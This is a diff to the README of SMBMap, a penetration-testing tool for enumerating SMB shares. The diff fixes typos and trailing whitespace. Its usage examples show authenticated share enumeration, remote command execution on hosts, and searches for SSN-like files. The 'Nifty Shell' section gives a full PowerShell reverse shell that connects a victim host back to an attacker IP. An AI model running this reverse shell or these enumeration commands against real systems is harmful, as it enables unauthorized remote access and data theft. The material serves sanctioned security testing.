@@ -19,7 +19,7 @@ pip install -r requirements.txt
 - Distrubted file content searching (new!)
 - File name matching (with an auto downoad capability)
 
-## Help 
+## Help
 ```
 SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
 
@@ -87,16 +87,16 @@ $ python smbmap.py -u 'apadmin' -p 'asdf1234!' -d ACME -H 10.1.3.30 -x 'net grou
 $  python smbmap.py --host-file smb-hosts.txt -u jsmith -p 'R33nisP!nckl3' -d ABC
 [+] Reading from stdin
 [+] Finding open SMB ports....
-[+] User SMB session establishd...
-[+] IP: 192.168.0.5:445 Name: unkown                                            
+[+] User SMB session established...
+[+] IP: 192.168.0.5:445 Name: unkown
         Disk                                                    Permissions
         ----                                                    -----------
         ADMIN$                                                  READ, WRITE
         C$                                                      READ, WRITE
         IPC$                                                    NO ACCESS
         TMPSHARE                                                READ, WRITE
-[+] User SMB session establishd...
-[+] IP: 192.168.2.50:445        Name: unkown                                            
+[+] User SMB session established...
+[+] IP: 192.168.2.50:445        Name: unkown
         Disk                                                    Permissions
         ----                                                    -----------
         IPC$                                                    NO ACCESS
@@ -110,27 +110,27 @@ $  python smbmap.py --host-file smb-hosts.txt -u jsmith -p 'R33nisP!nckl3' -d AB
 ```
 $ python smbmap.py -u ariley -p 'P@$$w0rd1234!' -d ABC -x 'net group "Domain Admins" /domain' -H 192.168.2.50
 [+] Finding open SMB ports....
-[+] User SMB session establishd...
-[+] IP: 192.168.2.50:445        Name: unkown                                            
+[+] User SMB session established...
+[+] IP: 192.168.2.50:445        Name: unkown
 Group name     Domain Admins
 Comment        Designated administrators of the domain
 
 Members
 
 -------------------------------------------------------------------------------
-abcadmin                  
+abcadmin
 The command completed successfully.
 ```
 ## Non recursive path listing (ls):
 ```
 $ python smbmap.py -H 172.16.0.24 -u Administrator -p 'changeMe' -r 'C$\Users'
 [+] Finding open SMB ports....
-[+] User SMB session establishd...
-[+] IP: 172.16.0.24:445 Name: 172.16.0.24                                       
+[+] User SMB session established...
+[+] IP: 172.16.0.24:445 Name: 172.16.0.24
     Disk                                                    Permissions
     ----                                                    -----------
     C$                                                      READ, WRITE
-    .Users                                             
+    .Users
     dw--w--w--                0 Wed Apr 29 13:15:25 2015    .
     dw--w--w--                0 Wed Apr 29 13:15:25 2015    ..
     dr--r--r--                0 Wed Apr 22 14:50:36 2015    Administrator
@@ -147,9 +147,9 @@ $ python smbmap.py -H 172.16.0.24 -u Administrator -p 'changeMe' -r 'C$\Users'
 ```
 $ python smbmap.py --host-file ~/Desktop/smb-workstation-sml.txt -u NopSec -p 'NopSec1234!' -d widgetworld -F '[1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]'
 [+] Finding open SMB ports....
-[+] User SMB session establishd on 192.168.0.99...
-[+] User SMB session establishd on 192.168.0.85...
-[+] User SMB session establishd on 192.168.0.89...
+[+] User SMB session established on 192.168.0.99...
+[+] User SMB session established on 192.168.0.85...
+[+] User SMB session established on 192.168.0.89...
 [+] File search started on 1 hosts...this could take a while
 [+] Job 4650e5a97b9f4ca884613f4b started on 192.168.0.99, result will be stored at C:\Temp\4650e5a97b9f4ca884613f4b.txt
 [+] File search started on 2 hosts...this could take a while
@@ -182,11 +182,11 @@ C:\Users\biffh\AppData\Local\Temp\Temporary Internet Files\Content.IE5\NV1MNBWA\
 This feature was added to compliment the file content searching feature
 
 ```
-$ python smbmap.py -H 192.168.1.24 -u Administrator -p 'R33nisP!nckle' -L 
+$ python smbmap.py -H 192.168.1.24 -u Administrator -p 'R33nisP!nckle' -L
 [!] Missing domain...defaulting to WORKGROUP
 [+] Finding open SMB ports....
-[+] User SMB session establishd...
-[+] IP: 192.168.1.24:445 Name: unkown                                            
+[+] User SMB session established...
+[+] IP: 192.168.1.24:445 Name: unkown
 [+] Host 192.168.1.24 Local Drives: C:\ D:\
 [+] Host 192.168.1.24 Net Drive(s):
     E:      \\vboxsrv\Public      VirtualBox Shared Folders
@@ -195,10 +195,10 @@ $ python smbmap.py -H 192.168.1.24 -u Administrator -p 'R33nisP!nckle' -L
 ## Nifty Shell:
 Run Powershell Script on Victim SMB host (change the IP in the code to your IP addres, i.e where the shell connects back to)
 ```
-$ python smbmap.py -u jsmith -p 'R33nisP!nckle' -d ABC -H 192.168.2.50 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.153""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' 
+$ python smbmap.py -u jsmith -p 'R33nisP!nckle' -d ABC -H 192.168.2.50 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.153""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'
 [+] Finding open SMB ports....
-[+] User SMB session establishd...
-[+] IP: 192.168.2.50:445        Name: unkown                                            
+[+] User SMB session established...
+[+] IP: 192.168.2.50:445        Name: unkown
 [!] Error encountered, sharing violation, unable to retrieve output
 ```
 
